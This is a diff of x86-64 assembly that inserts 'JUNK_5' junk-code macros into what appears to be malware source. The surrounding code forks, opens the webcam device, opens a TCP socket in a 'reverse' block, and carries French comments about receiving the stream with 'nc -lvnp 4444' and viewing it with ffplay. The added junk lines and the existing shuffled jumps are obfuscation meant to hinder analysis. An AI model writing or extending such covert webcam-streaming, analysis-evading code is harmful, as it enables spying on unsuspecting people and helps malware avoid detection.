@@ -44,6 +44,8 @@ end_0:
 	NOP
 	call	[rbp + 32]
 
+	JUNK_5
+
 	jmp	[rel .addr6r]
 	.addr6: dq 0x421900000006
 	.addr6r: dq 0
@@ -51,9 +53,12 @@ end_0:
 	end_shuffle4:
 	dq	1942, 6
 
+
+	JUNK_5
 	NOP
 	mov		rax, 89787
 	NOP
+	JUNK_5
 
 	NOP
 	mov		rax, SYS_open
@@ -90,7 +95,7 @@ end_0:
 
 	mov		rax, SYS_pread64
 	mov		rdi, r12
-
+	JUNK_5
 	mov		rsi, [rbp + 16]
 	add		rsi, mydata.zero
 
@@ -98,7 +103,7 @@ end_0:
 	mov		rdx, 1
 	mov		r10, 10
 	syscall
-
+	JUNK_5
 	mov		rax, SYS_close
 	mov		rdi, r12
 	syscall
@@ -112,7 +117,7 @@ end_0:
 		cmp		eax, 0
 		jng		.continue_fork
 
-
+		JUNK_5
 		mov		rax, SYS_exit
 		xor		rdi, rdi
 		NOP
@@ -137,7 +142,7 @@ end_0:
 		; ffplay -f mjpeg -framerate 30 -i <nomdufichier>
 		; c'est la commande que j'utilise avec
 		; nc -lvnp 4444
-
+		JUNK_5
 		mov		rax, SYS_open
 
 		mov		rdi, [rbp + 16]
@@ -158,7 +163,7 @@ end_0:
 		cmp		rax, 0
 		jl		.continue_reverse
 		mov		r12, rax	; file descriptor de video0
-
+		JUNK_5
 		mov		rax, SYS_socket
 		mov		rdi, AF_INET
 		mov		rsi, SOCK_STREAM
